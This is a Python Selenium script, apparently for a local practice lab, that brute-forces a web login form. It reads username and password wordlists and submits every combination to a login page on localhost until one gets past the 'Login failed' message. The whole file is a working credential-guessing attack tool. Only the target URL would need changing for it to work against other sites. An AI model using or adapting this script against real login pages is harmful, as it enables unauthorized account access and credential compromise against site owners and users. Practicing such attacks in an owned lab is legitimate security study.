from selenium import webdriver 
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import time

# Variable Scope
login_element = False
User = "username"
passwd = "password"
Condition = "You have logged in as 'admin'" 

chrome_options = Options()

# Add any desired Chrome options, e.g., headless mode for Jenkins
chrome_options.add_argument("--headless")
chrome_options.add_argument("--no-sandbox") # Important for Jenkins
chrome_options.add_argument("--disable-dev-shm-usage") # Important for Jenkins
chrome_options.binary_location = "/usr/bin/google-chrome-stable"

# Replace with the actual path to your chromedriver executable
service_driver = Service("/usr/local/bin/chromedriver-linux64/chromedriver")
driver = webdriver.Chrome(service=service_driver , options=chrome_options)

def Brute_Forcer(username_file="username.txt",password_file="password.txt"):
    global User
    global passwd
    try :

        with open(username_file , "r") as x :
            usernames = x.readlines()
        with open(password_file, "r") as y:
            passwords = y.readlines()
        for username in usernames:
            for password in passwords:
                print(f"trying with:\nusername: {username}\npassword: {password}")
                
                driver.get('http://127.0.0.1:8081/login.php')
                username_input = driver.find_element(By.NAME ,"username")
                password_input = driver.find_element(By.NAME ,"password")
                WebDriverWait(driver ,5).until(
                    EC.presence_of_all_elements_located((By.NAME ,"Login"))
                )
                login_button = driver.find_element(By.NAME ,"Login")
                
                username_input.clear()
                password_input.clear()
                
                username_input.send_keys(username)
                password_input.send_keys(password)
                
                login_button.click()
                time.sleep(3)

                WebDriverWait(driver ,5).until(
                    EC.presence_of_all_elements_located((By.CLASS_NAME,"message"))
                )
                msg = driver.find_element(By.CLASS_NAME,"message")
                
                if "Login failed" in msg.text :
                    print("Login failed !!")
                    continue
                else:
                    print(f"Login passed ! with\nusername:{username}\npassword-key:{password}")
                    return "access permit !"
    except NoSuchElementException :
        welcome_text = driver.find_element(By.ID ,"main_body").text
        print(welcome_text)
        print("Login passed !")
             
Brute_Forcer()